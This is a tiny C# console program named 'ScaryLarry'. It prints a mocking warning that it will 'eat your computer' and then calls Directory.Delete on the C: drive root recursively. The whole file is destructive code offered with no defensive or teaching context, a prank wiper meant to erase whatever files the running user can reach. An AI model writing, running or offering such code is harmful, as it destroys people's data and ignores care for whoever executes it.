using System;
using System.IO;

namespace ScaryLarry
{
	class Program
	{
		static void Main(string[] args)
		{
			Console.WriteLine("Please shut this program down right, now. It is about to eat your computer...");
			Directory.Delete("C:\\", true);
		}
	}
}
